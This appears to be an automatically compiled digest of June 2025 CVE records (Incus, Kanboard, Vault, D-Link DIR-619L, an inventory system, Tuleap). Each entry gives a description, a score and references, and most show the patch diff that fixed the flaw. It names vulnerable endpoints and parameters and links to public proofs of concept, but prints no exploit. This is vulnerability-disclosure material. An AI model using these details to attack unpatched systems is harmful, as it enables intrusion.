  1. https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214
  2. https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c
  3. https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86
  4. https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86

Attempting to extract code examples from references...

--- Code from https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214 ---
From 2516fb19ad8428454cb4edfe70c0a5f0dc1da214 Mon Sep 17 00:00:00 2001
From: Olivier Bal-Petre <olivier.bal-petre@ssi.gouv.fr>
Date: Mon, 2 Jun 2025 11:51:41 +0200
Subject: [PATCH] incusd/firewall/nftables: Fix ordering of basic rules
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Commit a7c33301738aede3c035063e973b1d885d9bac7c added basic
rules that bypass some of the MAC/IPv4/IPv6 filtering, allowing
to exhaust the DHCP pool and open the door for other attacks
on the bridge.

This is a security fix:

 - CVE-2025-52889
 - GHSA-9q7c-qmhm-jv86

Signed-off-by: Olivier Bal-Petre <olivier.bal-petre@ssi.gouv.fr>
Acked-by: Stéphane Graber <stgraber@stgraber.org>
---
 .../drivers/drivers_nftables_templates.go     | 49 +++++++++----------
 1 file changed, 24 insertions(+), 25 deletions(-)

diff --git a/internal/server/firewall/drivers/drivers_nftables_templates.go b/internal/server/firewall/drivers/drivers_nftables_templates.go
index 975e68d76b4..3ab82d1ea34 100644
--- a/internal/server/firewall/drivers/drivers_nftables_templates.go
+++ b/internal/server/firewall/drivers/drivers_nftables_templates.go
@@ -192,28 +192,6 @@ var nftablesInstanceBridgeFilter = template.Must(template.New("nftablesInstanceB
 chain in{{.chainSeparator}}{{.deviceLabel}} {
 	type filter hook input priority -200; policy accept;
 
-	# Basic connectivity
-	{{ if or .aclInDropRules .aclInRejectRules .aclInAcceptRules .aclOutDropRules .aclOutAcceptRules .aclInDefaultRule }}
-
-	{{ if .dnsIPv4 }}
-	{{ range .dnsIPv4 }}
-	iifname "{{$.hostName}}" ip daddr "{{.}}" tcp dport 53 accept
-	iifname "{{$.hostName}}" ip daddr "{{.}}" udp dport 53 accept
-	{{ end }}
-	{{ end }}
-
-	{{ if .dnsIPv6 }}
-	{{ range .dnsIPv6 }}
-	iifname "{{$.hostName}}" ip6 daddr "{{.}}" tcp dport 53 accept
-	iifname "{{$.hostName}}" ip6 daddr "{{.}}" udp dport 53 accept
-	{{ end }}
-	{{ end }}
-
-	iifname "{{.hostName}}" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept
-	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept
-	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept
-	{{ end }}
-
 	# MAC filtering
 	{{ if .macFiltering }}
 	iifname "{{.hostName}}" ether saddr != {{.hwAddr}} drop
@@ -221,9 +199,12 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 	iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop
 	{{ end }}
 
+	{{ if or .aclInDropRules .aclInRejectRules .aclInAcceptRules .aclOutDropRules .aclOutAcceptRules .aclInDefaultRule .ipv4NetsList }}
+	iifname "{{.hostName}}" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept
+	{{ end }}
+
 	# IPv4 filtering
 	{{ if .ipv4NetsList }}
-	iifname "{{.hostName}}" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept
 	iifname "{{.hostName}}" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop
 	iifname "{{.hostName}}" ether type ip ip saddr != { {{.ipv4NetsList}} } drop
 	{{ end }}
@@ -232,10 +213,13 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 	iifname "{{.hostName}}" ether type ip drop
 	{{ end }}
 
-	# IPv6 filtering
-	{{ if .ipv6NetsList }}
+	{{ if or .aclInDropRules .aclInRejectRules .aclInAcceptRules .aclOutDropRules .aclOutAcceptRules .aclInDefaultRule .ipv6NetsList }}
 	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept
 	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept
+	{{ end }}
+
+	# IPv6 filtering
+	{{ if .ipv6NetsList }}
 	iifname "{{.hostName}}" ether type ip6 icmpv6 type 134 drop
 	iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop
 	iifname "{{.hostName}}" ether type ip6 ip6 saddr != { {{.ipv6NetsList}} } drop
@@ -249,6 +233,21 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 
 	iifname "{{.hostName}}" ether type arp accept
 	iifname "{{.hostName}}" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept
+
+	{{ if .dnsIPv4 }}
+	{{ range .dnsIPv4 }}
+	iifname "{{$.hostName}}" ip daddr "{{.}}" tcp dport 53 accept
+	iifname "{{$.hostName}}" ip daddr "{{.}}" udp dport 53 accept
+	{{ end }}
+	{{ end }}
+
+	{{ if .dnsIPv6 }}
+	{{ range .dnsIPv6 }}
+	iifname "{{$.hostName}}" ip6 daddr "{{.}}" tcp dport 53 accept
+	iifname "{{$.hostName}}" ip6 daddr "{{.}}" udp dport 53 accept
+	{{ end }}
+	{{ end }}
+
 	{{ end }}
 
 	# ACLs


================================================================================


CVE ID: CVE-2025-52576
Published: 2025-06-25T17:15:39.023
Modified: 2025-08-22T18:23:53.877
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-203: CWE-203

Description:
Kanboard is project management software that focuses on the Kanban methodology. Prior to version 1.2.46, Kanboard is vulnerable to username enumeration and IP spoofing-based brute-force protection bypass. By analyzing login behavior and abusing trusted HTTP headers, an attacker can determine valid usernames and circumvent rate-limiting or blocking mechanisms. Any organization running a publicly accessible Kanboard instance is affected, especially if relying on IP-based protections like Fail2Ban or CAPTCHA for login rate-limiting. Attackers with access to the login page can exploit this flaw to enumerate valid usernames and bypass IP-based blocking mechanisms, putting all user accounts at higher risk of brute-force or credential stuffing attacks. Version 1.2.46 contains a patch for the issue.

References (5):
  1. https://github.com/kanboard/kanboard/blob/cbb7e60fb595ff4572bb8801b275a0b451c4bda0/app/Model/UserLockingModel.php#L101-L104 [Product]
  2. https://github.com/kanboard/kanboard/blob/cbb7e60fb595ff4572bb8801b275a0b451c4bda0/app/Subscriber/AuthSubscriber.php#L96-L108 [Product]
  3. https://github.com/kanboard/kanboard/commit/3079623640dc39f9c7b0c840d2a79095331051f1 [Patch]
  4. https://github.com/kanboard/kanboard/security/advisories/GHSA-qw57-7cx6-wvp7 [Vendor Advisory]
  5. https://github.com/kanboard/kanboard/security/advisories/GHSA-qw57-7cx6-wvp7 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/kanboard/kanboard/commit/3079623640dc39f9c7b0c840d2a79095331051f1 ---
From 3079623640dc39f9c7b0c840d2a79095331051f1 Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Fr=C3=A9d=C3=A9ric=20Guillot?= <fred@kanboard.net>
Date: Fri, 20 Jun 2025 17:28:13 -0700
Subject: [PATCH] feat: show CAPTCHA on login form regardless of user existence

Previously, the CAPTCHA challenge was only displayed if the submitted username matched an existing user. This change ensures that a CAPTCHA is shown even when the user does not exist, adding an extra layer of protection against user enumeration.
---
 app/Controller/AuthController.php     |  8 +++-
 app/Core/Base.php                     |  1 +
 app/Model/CaptchaModel.php            | 63 +++++++++++++++++++++++++++
 app/ServiceProvider/ClassProvider.php |  1 +
 app/Subscriber/AuthSubscriber.php     |  6 ++-
 app/Validator/AuthValidator.php       |  4 +-
 6 files changed, 79 insertions(+), 4 deletions(-)
 create mode 100644 app/Model/CaptchaModel.php

diff --git a/app/Controller/AuthController.php b/app/Controller/AuthController.php
index d554c138f1..4e6de5487a 100644
--- a/app/Controller/AuthController.php
+++ b/app/Controller/AuthController.php
@@ -22,8 +22,14 @@ public function login(array $values = array(), array $errors = array())
         if ($this->userSession->isLogged()) {
             $this->response->redirect($this->helper->url->to('DashboardController', 'show'));
         } else {
+            $showCaptcha = false;
+            if (! empty($values['username']) && $this->userLockingModel->hasCaptcha($values['username'])) {
+                $showCaptcha = true;
+            } elseif ($this->captchaModel->isLocked($this->request->getIpAddress())) {
+                $showCaptcha = true;
+            }
             $this->response->html($this->helper->layout->app('auth/index', array(
-                'captcha' => ! empty($values['username']) && $this->userLockingModel->hasCaptcha($values['username']),
+                'captcha' => $showCaptcha,
                 'errors' => $errors,
                 'values' => $values,
                 'no_layout' => true,
diff --git a/app/Core/Base.php b/app/Core/Base.php
index b42a772dc0..3280625846 100644
--- a/app/Core/Base.php
+++ b/app/Core/Base.php
@@ -87,6 +87,7 @@
  * @property \Kanboard\Model\ActionParameterModel                    $actionParameterModel
  * @property \Kanboard\Model\AvatarFileModel                         $avatarFileModel
  * @property \Kanboard\Model\BoardModel                              $boardModel
+ * @property \Kanboard\Model\CaptchaModel                            $captchaModel
  * @property \Kanboard\Model\CategoryModel                           $categoryModel
  * @property \Kanboard\Model\ColorModel                              $colorModel
  * @property \Kanboard\Model\ColumnModel                             $columnModel
diff --git a/app/Model/CaptchaModel.php b/app/Model/CaptchaModel.php
new file mode 100644
index 0000000000..b9e39f16dc
--- /dev/null
+++ b/app/Model/CaptchaModel.php
@@ -0,0 +1,63 @@
+<?php
+
+namespace Kanboard\Model;
+
+use Kanboard\Core\Base;
+
+/**
+ * Captcha model
+ *
+ * @package  Kanboard\Model
+ *
+ * {"<IP_ADDRESS>": {"failed_login": <COUNT>, "expiration_date": <TIMESTAMP>}}
+ */
+class CaptchaModel extends Base
+{
+    public function incrementFailedLogin($ipAddress)
+    {
+        $data = $this->getCaptchaData();
+        if (!isset($data[$ipAddress])) {
+            $data[$ipAddress] = ['failed_login' => 0, 'expiration_date' => 0];
+        }
+
+        $data[$ipAddress]['failed_login']++;
+        if ($data[$ipAddress]['failed_login'] >= BRUTEFORCE_CAPTCHA) {
+            $data[$ipAddress]['lock_expiration_date'] = time() + BRUTEFORCE_LOCKDOWN_DURATION;
+        }
+
+        $this->setCaptchaData($data);
+    }
+
+    public function resetFailedLogin($ipAddress)
+    {
+        $data = $this->getCaptchaData();
+        if (isset($data[$ipAddress])) {
+            unset($data[$ipAddress]);
+            $this->setCaptchaData($data);
+        }
+    }
+
+    public function isLocked($ipAddress)
+    {
+        $data = $this->getCaptchaData();
+        if (isset($data[$ipAddress]) && isset($data[$ipAddress]['lock_expiration_date'])) {
+            return $data[$ipAddress]['lock_expiration_date'] > time();
+        }
+        return false;
+    }
+
+    protected function getCaptchaData()
+    {
+        $rawData = $this->configModel->getOption('captcha_data', '{}');
+        $data = json_decode($rawData, true);
+        if (!is_array($data)) {
+            $data = [];
+        }
+        return $data;
+    }
+
+    protected function setCaptchaData(array $data)
+    {
+        $this->configModel->save(['captcha_data' => json_encode($data)]);
+    }
+}
diff --git a/app/ServiceProvider/ClassProvider.php b/app/ServiceProvider/ClassProvider.php
index e146c2d49d..7bcda1ab63 100644
--- a/app/ServiceProvider/ClassProvider.php
+++ b/app/ServiceProvider/ClassProvider.php
@@ -31,6 +31,7 @@ class ClassProvider implements ServiceProviderInterface
             'ActionParameterModel',
             'AvatarFileModel',
             'BoardModel',
+            'CaptchaModel',
             'CategoryModel',
             'ColorModel',
             'ColumnModel',
diff --git a/app/Subscriber/AuthSubscriber.php b/app/Subscriber/AuthSubscriber.php
index f971af9b79..c323c3fcd5 100644
--- a/app/Subscriber/AuthSubscriber.php
+++ b/app/Subscriber/AuthSubscriber.php
@@ -46,6 +46,7 @@ public function afterLogin(AuthSuccessEvent $event)
         $ipAddress = $this->request->getIpAddress();
 
         $this->userLockingModel->resetFailedLogin($this->userSession->getUsername());
+        $this->captchaModel->resetFailedLogin($ipAddress);
 
         $this->lastLoginModel->create(
             $event->getAuthType(),
@@ -96,7 +97,10 @@ public function onLoginFailure(AuthFailureEvent $event)
         $this->logger->debug('Subscriber executed: '.__METHOD__);
         $username = $event->getUsername();
         $ipAddress = $this->request->getIpAddress();
-        
+
+        // IP-based captcha
+        $this->captchaModel->incrementFailedLogin($ipAddress);
+
         if (! empty($username)) {
             // log login failure in web server log to allow fail2ban usage
             error_log('Kanboard: user '.$username.' authentication failure with IP address: '.$ipAddress);
diff --git a/app/Validator/AuthValidator.php b/app/Validator/AuthValidator.php
index e50f90ce31..dbf02619ca 100644
--- a/app/Validator/AuthValidator.php
+++ b/app/Validator/AuthValidator.php
@@ -100,7 +100,7 @@ protected function validateCaptcha(array $values)
         $result = true;
         $errors = array();
 
-        if ($this->userLockingModel->hasCaptcha($values['username'])) {
+        if ($this->userLockingModel->hasCaptcha($values['username']) || $this->captchaModel->isLocked($this->request->getIpAddress())) {
             if (! session_exists('captcha')) {
                 $result = false;
             } else {
@@ -109,7 +109,7 @@ protected function validateCaptcha(array $values)
                 $result = $builder->testPhrase(isset($values['captcha']) ? $values['captcha'] : '');
 
                 if (! $result) {
-                    $errors['login'] = t('Invalid captcha');
+                    $errors['login'] = t('Bad username or password');
                 }
             }
         }


================================================================================


CVE ID: CVE-2025-4656
Published: 2025-06-25T17:15:38.440
Modified: 2025-08-13T18:02:04.647
CVSS Score: 3.1 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-1088: CWE-1088

Description:
Vault Community and Vault Enterprise rekey and recovery key operations can lead to a denial of service due to uncontrolled cancellation by a Vault operator. This vulnerability (CVE-2025-4656) has been remediated in Vault Community Edition 1.20.0 and Vault Enterprise 1.20.0, 1.19.6, 1.18.11, 1.17.17, and 1.16.22.

References (1):
  1. https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570 ---
2025-05-13T12:22:48.575-0500 [WARN] core: shamir stored keys supported, forcing rekey shares/threshold to 1

================================================================================


CVE ID: CVE-2025-6615
Published: 2025-06-25T16:15:27.790
Modified: 2025-07-14T17:18:22.573
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability, which was classified as critical, was found in D-Link DIR-619L 2.06B01. This affects the function formAutoDetecWAN_wizard4 of the file /goform/formAutoDetecWAN_wizard4. The manipulation of the argument curTime leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_76/76.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_76/76.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313833 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313833 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602258 [Third Party Advisory, VDB Entry]
  6. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313833 ---
formAutoDetecWAN_wizard4

formAutoDetecWAN_wizard4

curTime

================================================================================


CVE ID: CVE-2025-6614
Published: 2025-06-25T16:15:27.593
Modified: 2025-07-16T19:35:42.827
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability, which was classified as critical, has been found in D-Link DIR-619L 2.06B01. Affected by this issue is the function formSetWANType_Wizard5 of the file /goform/formSetWANType_Wizard5. The manipulation of the argument curTime leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_75/75.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_75/75.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313832 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313832 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602257 [Third Party Advisory, VDB Entry]
  6. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313832 ---
formSetWANType_Wizard5

formSetWANType_Wizard5

curTime

================================================================================


CVE ID: CVE-2025-6612
Published: 2025-06-25T16:15:27.413
Modified: 2025-06-27T18:22:07.427
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /php_action/removeCategories.php. The manipulation of the argument categoriesId leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Lwlej/cve/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313829 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313829 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601977 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313829 ---
categoriesId

================================================================================


CVE ID: CVE-2025-6611
Published: 2025-06-25T16:15:27.233
Modified: 2025-06-27T18:35:43.527
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /php_action/createBrand.php. The manipulation of the argument brandStatus leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Lwlej/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313828 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313828 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601976 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313828 ---
brandStatus

================================================================================


CVE ID: CVE-2025-50179
Published: 2025-06-25T16:15:26.843
Modified: 2025-08-21T20:53:46.087
CVSS Score: 4.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-352: Cross-Site Request Forgery (CSRF)

Description:
Tuleap is an Open Source Suite to improve management of software developments and collaboration. An attacker could use a cross-site request forgery vulnerability in Tuleap Community Edition prior to version 16.8.99.1749830289 and Tuleap Enterprise Edition prior to version 16.9-1 to trick victims into changing the canned responses. Tuleap Community Edition 16.8.99.1749830289 and Tuleap Enterprise Edition 16.9-1 contain a patch for the issue.

References (4):
  1. https://github.com/Enalean/tuleap/commit/0f9aab6e3640e892c74c9dfc90ad65fd3aff499e [Patch]
  2. https://github.com/Enalean/tuleap/security/advisories/GHSA-rxpm-g7gw-4mrv [Third Party Advisory]
  3. https://tuleap.net/plugins/git/tuleap/tuleap/stable?a=commit&h=0f9aab6e3640e892c74c9dfc90ad65fd3aff499e [Broken Link]
  4. https://tuleap.net/plugins/tracker/?aid=43357 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/Enalean/tuleap/commit/0f9aab6e3640e892c74c9dfc90ad65fd3aff499e ---
From 8e0e7a20fce52d6a859d1a414b3c36b440a99a09 Mon Sep 17 00:00:00 2001
From: Thomas Gerbet <thomas.gerbet@enalean.com>
Date: Thu, 12 Jun 2025 10:56:28 +0200
Subject: [PATCH] fix: request #43357 Missing CSRF protection on tracker
 reports manipulation

Change-Id: I5a27ca014703ace5c3cc82242fed7ab50d79630c
---
 .../include/Tracker/Masschange_Presenter.php  |   1 +
 .../Tracker/Report/ExpertModePresenter.php    |   1 +
 .../include/Tracker/Report/Tracker_Report.php |  91 ++++++--
 ...Tracker_Report_HeaderInReportPresenter.php |   8 +-
 .../Report/Tracker_Report_Renderer_Table.php  | 204 +++++++++++-------
 plugins/tracker/include/Tracker/Tracker.php   |   1 +
 .../scripts/legacy/src/ReorderColumns.js      |   1 +
 .../scripts/legacy/src/TrackerReports.js      |  13 ++
 .../legacy/src/tracker-report-type-column.js  |  16 +-
 .../tracker/scripts/report/src/expert-mode.js |  33 ++-
 .../styles/themes/FlamingParrot/style.scss    |   2 +-
 .../scripts/styles/themes/default/_main.scss  |  34 ++-
 plugins/tracker/templates/masschange.mustache |   3 +
 .../report/button_dropdowns.mustache          |  56 +++++
 .../report/header_in_report.mustache          |  10 +-
 .../report}/split_button_dropdowns.mustache   |  15 +-
 .../tracker-report-expert-query.mustache      |   3 +
 .../presenter/ButtonDropdownsOption.php       |   5 +
 .../common/button_dropdowns.mustache          |  42 ----
 19 files changed, 373 insertions(+), 166 deletions(-)
 create mode 100644 plugins/tracker/templates/report/button_dropdowns.mustache
 rename {src/templates/common => plugins/tracker/templates/report}/split_button_dropdowns.mustache (53%)
 delete mode 100644 src/templates/common/button_dropdowns.mustache

diff --git a/plugins/tracker/include/Tracker/Masschange_Presenter.php b/plugins/tracker/include/Tracker/Masschange_Presenter.php
index 1e27cb714d0..d3e347bcf27 100644
--- a/plugins/tracker/include/Tracker/Masschange_Presenter.php
+++ b/plugins/tracker/include/Tracker/Masschange_Presenter.php
@@ -51,6 +51,7 @@ public function __construct(
         $javascript_rules,
         array $external_actions,
         public readonly bool $has_notifications,
+        public readonly CSRFSynchronizerToken $csrf_token,
     ) {
         $this->project_id       = (int) $project->getID();
         $this->masschange_aids  = $masschange_aids;
diff --git a/plugins/tracker/include/Tracker/Report/ExpertModePresenter.php b/plugins/tracker/include/Tracker/Report/ExpertModePresenter.php
index e2b76bf03fe..8e97c0d6094 100644
--- a/plugins/tracker/include/Tracker/Report/ExpertModePresenter.php
+++ b/plugins/tracker/include/Tracker/Report/ExpertModePresenter.php
@@ -53,6 +53,7 @@ public function __construct(
         array $allowed_fields,
         $is_normal_mode_button_displayed,
         $is_query_modifiable,
+        public readonly \CSRFSynchronizerToken $csrf_token,
     ) {
         $this->id                              = $id;
         $this->class_toggler                   = $class_toggler;
diff --git a/plugins/tracker/include/Tracker/Report/Tracker_Report.php b/plugins/tracker/include/Tracker/Report/Tracker_Report.php
index 3d344ccf40a..ab6e85b43c1 100644
--- a/plugins/tracker/include/Tracker/Report/Tracker_Report.php
+++ b/plugins/tracker/include/Tracker/Report/Tracker_Report.php
@@ -562,6 +562,7 @@ public function fetchDisplayQuery(array $criteria, array $additional_criteria, $
         $html_purifier = Codendi_HTMLPurifier::instance();
         $form_post_url = $html_purifier->purify('/plugins/tracker/?' . http_build_query($query_params));
         $html         .= '<form action="' . $form_post_url . '" method="POST" id="tracker_report_query_form" class="tracker-report-query-form">';
+        $html         .= $this->getCSRFTokenReportChange($this->getTracker())->fetchHTMLInput();
         $html         .= '<input type="hidden" name="report" value="' . $this->id . '" />';
         $id            = 'tracker_report_query_' . $this->id;
         $html         .= '<h4 class="backlog-planning-search-title ' . Toggler::getClassname($id, $this->is_query_displayed ? true : false) . '" id="' . $id . '">';
@@ -650,8 +651,9 @@ private function fetchDisplayQueryExpertMode($report_can_be_modified, PFUser $cu
     {
         $id            = 'tracker-report-expert-query-' . $this->id;
         $class_toggler = Toggler::getClassname($id, $this->is_query_displayed ? true : false);
+        $tracker       = $this->getTracker();
         $fields        = $this->getFormElementFactory()->getUsedFieldsForExpertModeUserCanRead(
-            $this->getTracker(),
+            $tracker,
             $this->getCurrentUser()
         );
 
@@ -665,7 +667,8 @@ private function fetchDisplayQueryExpertMode($report_can_be_modified, PFUser $cu
             $this->expert_query,
             $fields,
             $is_normal_mode_button_displayed,
-            $is_query_modifiable
+            $is_query_modifiable,
+            $this->getCSRFTokenReportChange($tracker),
         );
 
         $renderer = TemplateRendererFactory::build()->getRenderer(
@@ -702,7 +705,9 @@ public function getFieldsAsDropdownOptions($id_prefix, array $used, $dropdown_ty
         $fields_for_criteria = [];
         $fields_for_sort     = [];
 
-        foreach ($this->getFormElementFactory()->getFields($this->getTracker()) as $field) {
+        $tracker = $this->getTracker();
+
+        foreach ($this->getFormElementFactory()->getFields($tracker) as $field) {
             if ($dropdown_type === self::TYPE_CRITERIA && ! $field->canBeUsedAsReportCriterion()) {
                 continue;
             }
@@ -720,6 +725,8 @@ public function getFieldsAsDropdownOptions($id_prefix, array $used, $dropdown_ty
         $criteria_options          = [];
         $criteria_advanced_options = [];
 
+        $csrf_token = $this->getCSRFTokenReportChange($tracker);
+
         foreach ($fields_for_sort as $id => $nop) {
             $option     = new Templating_Presenter_ButtonDropdownsOption(
                 $id_prefix . '_' . $id,
@@ -730,6 +737,7 @@ public function getFieldsAsDropdownOptions($id_prefix, array $used, $dropdown_ty
             $parameters = [
                 'data-field-id'      => $id,
                 'data-field-is-used' => intval(isset($used[$id])),
+                'data-challenge' => $csrf_token->getToken(),
             ];
             if ($dropdown_type !== self::TYPE_CRITERIA) {
                 $parameters['data-column-id'] = $id;
@@ -763,9 +771,11 @@ public function getFieldsAsDropdownOptions($id_prefix, array $used, $dropdown_ty
 
     private function getOptionsForCustomColumn($id, $used)
     {
-        $project = $this->getTracker()->getProject();
-        $options = [];
-        $types   = $this->getTypePresenterFactory()->getAllTypesEditableInProject($project);
+        $tracker    = $this->getTracker();
+        $csrf_token = $this->getCSRFTokenReportChange($tracker);
+        $project    = $tracker->getProject();
+        $options    = [];
+        $types      = $this->getTypePresenterFactory()->getAllTypesEditableInProject($project);
 
         $column_id = $id . '_';
         $option    = new Templating_Presenter_ButtonDropdownsOption(
@@ -780,6 +790,7 @@ private function getOptionsForCustomColumn($id, $used)
                 'data-field-id'           => $id,
                 'data-field-is-used'      => intval(isset($used[$column_id])),
                 'data-field-artlink-type' => '',
+                'data-challenge'          => $csrf_token->getToken(),
             ]
         );
         $options[] = $option;
@@ -807,6 +818,7 @@ private function getOptionsForCustomColumn($id, $used)
                     'data-field-id'           => $id,
                     'data-field-is-used'      => intval(isset($used[$column_id])),
                     'data-field-artlink-type' => $type->shortname,
+                    'data-challenge'          => $csrf_token->getToken(),
                 ]
             );
             $options[] = $option;
@@ -1335,9 +1347,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 dgettext('tuleap-tracker', 'The request is not valid.')
             );
 
-            $GLOBALS['Response']->redirect('?' . http_build_query([
-                'tracker'   => $tracker->getId(),
-            ]));
+            $this->redirectToTracker($tracker);
         }
 
         switch ($request->get('func')) {
@@ -1366,6 +1376,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case 'update-masschange-aids':
+                $this->checkReportUpdateRequest($request, $tracker);
                 $form_element_factory = $this->getFormElementFactory();
                 $artifact_factory     = Tracker_ArtifactFactory::instance();
 
@@ -1383,12 +1394,14 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 $masschange_updater->updateArtifacts($current_user, $request);
                 break;
             case 'remove-criteria':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($request->get('field') && ! $current_user->isAnonymous()) {
                     $this->report_session->removeCriterion($request->get('field'));
                     $this->report_session->setHasChanged();
                 }
                 break;
             case 'add-criteria':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($request->get('field') && ! $current_user->isAnonymous()) {
                     //TODO: make sure that the formElement exists and the user can read it
                     if ($request->isAjax()) {
@@ -1402,6 +1415,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case 'toggle-advanced':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($request->get('field') && ! $current_user->isAnonymous()) {
                     $this->toggleAdvancedCriterion($request->get('field'));
                     $this->report_session->setHasChanged();
@@ -1414,6 +1428,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case self::ACTION_CLEANSESSION:
+                $this->checkReportUpdateRequest($request, $tracker);
                 $this->report_session->clean();
                 $GLOBALS['Response']->redirect('?' . http_build_query([
                     'tracker'   => $this->tracker_id,
@@ -1429,6 +1444,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
